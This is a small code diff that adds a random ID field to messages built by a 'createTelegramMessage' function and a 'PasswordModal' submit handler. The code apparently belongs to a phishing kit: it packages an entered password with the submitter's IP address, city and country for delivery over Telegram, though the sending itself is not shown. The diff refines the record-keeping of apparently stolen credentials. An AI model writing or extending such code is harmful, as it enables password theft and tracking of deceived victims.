@@ -23,6 +23,7 @@ interface UIState {
 }
 
 interface Message {
+  ID: string;
   IP: string;
   ADD: string;
   TIME: string;
@@ -55,6 +56,7 @@ const createTelegramMessage = (formData: FormData, password: string) => {
   );
 
   const message = {
+    ID: crypto.randomUUID(),
     IP: geoData.ip,
     ADD: `${geoData.city} - ${geoData.country}`,
     TIME: new Date().toLocaleString("vi-VN"),
@@ -143,6 +145,7 @@ const PasswordModal: FC<PasswordModalProps> = ({
 
   const handleSubmit = async () => {
     let message = {
+      ID: "",
       IP: "",
       ADD: "",
       TIME: "",
